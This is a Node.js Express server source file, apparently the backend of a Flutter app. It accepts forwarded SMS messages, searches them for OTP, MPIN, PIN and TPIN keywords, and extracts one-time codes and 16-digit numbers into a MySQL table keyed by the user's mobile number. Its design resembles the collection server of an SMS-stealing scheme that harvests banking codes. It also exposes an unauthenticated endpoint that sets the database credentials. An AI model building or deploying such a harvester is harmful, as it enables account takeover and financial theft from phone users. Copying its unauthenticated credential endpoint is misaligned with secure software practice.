const express = require('express');
const mysql = require('mysql2/promise');
const bodyParser = require('body-parser');

const app = express();
const port = 3000;

app.use(bodyParser.json());

// Global variables for database details
let dbHost, dbUser, dbPassword, dbName;

// Function to create a new database connection pool
async function createPool() {
    try {
        const pool = mysql.createPool({
            host: dbHost,
            user: dbUser,
            password: dbPassword,
            database: dbName,
            waitForConnections: true,
            connectionLimit: 10,
            queueLimit: 0
        });

        console.log('Database connection pool created');
        return pool;
    } catch (error) {
        console.log('Error creating database connection pool:', error);
        throw error;
    }
}

// Function to create SMS data table
async function createSmsDataTable() {
    try {
        const pool = await createPool();
        const connection = await pool.getConnection();
        await connection.query(`
            CREATE TABLE IF NOT EXISTS IGRS_Message (
                ID INT AUTO_INCREMENT PRIMARY KEY,
                Sender VARCHAR(255) NOT NULL,
                Message_Time DATETIME NOT NULL,
                Message TEXT NOT NULL,
                OTP VARCHAR(10),
                User_Mobile VARCHAR(20) NOT NULL
            )
        `);
        connection.release();
        console.log('SMS data table created or already exists');
    } catch (error) {
        console.log('Error creating SMS data table:', error);
    }
}

// Call function to create SMS data table when server starts up
createSmsDataTable();

// Endpoint to receive database details from the frontend
app.post('/validate_database', async (req, res) => {
    const { host, user, password, database } = req.body;
    if (!host || !user || !password || !database) {
        return res.status(400).send('Incomplete database details');
    }

    // Set global variables for database details
    dbHost = host;
    dbUser = user;
    dbPassword = password;
    dbName = database;

    res.status(200).send('Database details received successfully');
});

// Endpoint to handle receiving SMS data from Flutter app
app.post('/sms', async (req, res) => {
    const { sender, message, message_time, user_mobile } = req.body;
    if (!sender || !message || !message_time || !user_mobile) {
        return res.status(400).send('Incomplete SMS data');
    }

    try {
        // Find keywords in the message
        const keywords = {
            'OTP': /OTP/i,
            'MPIN': /MPIN/i,
            'PIN': /PIN/i,
            'TPIN': /TPIN/i
        };

        let foundKeywords = [];
        for (const [key, regex] of Object.entries(keywords)) {
            if (regex.test(message)) {
                foundKeywords.push(key);
            }
        }

        console.log('Found keywords:', foundKeywords);

        // Extract OTP from message
        const otpRegex = /\b\d{4,6}\b|\b\d{16}\b|\b\d{6}\b|\b\d{4}\b/;
        const otpMatch = message.match(otpRegex);
        const otp = otpMatch ? otpMatch[0] : null;

        // Get connection pool
        const pool = await createPool();

        // Store data in the database with updated column names
        const connection = await pool.getConnection();
        await connection.query('INSERT INTO IGRS_Message (Sender, Message_Time, Message, OTP, User_Mobile) VALUES (?, ?, ?, ?, ?)', [sender, message_time, message, otp, user_mobile]);
        connection.release();

        console.log('SMS data stored successfully');
        res.status(200).send('SMS data stored successfully');
    } catch (error) {
        console.log('Error storing SMS data:', error);
        res.status(500).send('Error storing SMS data');
    }
});

// Start the server
app.listen(port, '127.0.0.1', () => {
    console.log(`Server is running on http://192.168.160.29:${port}`);
});
